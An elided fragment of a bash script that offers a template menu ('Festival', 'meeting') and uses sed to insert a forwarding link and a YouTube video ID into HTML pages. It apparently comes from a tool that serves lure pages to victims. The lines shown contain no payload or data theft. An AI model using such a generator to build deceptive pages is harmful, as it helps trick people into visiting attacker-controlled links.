...
sed 's+forwarding_link+'$link'+g' festival.html > index3.html
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival\e[0m\n"
...
sed 's+forwarding_link+'$link'+g' meeting.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
